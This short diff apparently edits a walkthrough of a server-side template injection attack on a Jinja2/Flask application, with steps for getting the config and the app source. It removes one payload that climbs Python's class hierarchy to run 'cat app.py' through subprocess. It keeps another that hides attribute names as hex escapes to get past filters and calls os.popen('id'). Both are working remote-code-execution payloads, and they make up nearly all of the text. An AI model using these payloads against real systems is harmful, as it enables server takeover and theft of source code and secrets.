@@ -8,10 +8,6 @@ Step 1, get the config
 
 Step 2, get the app source code
 
-``` python
-{{ ''.__class__.__mro__[1].__subclasses__()[407]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
-```
-
 
 ``` python
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
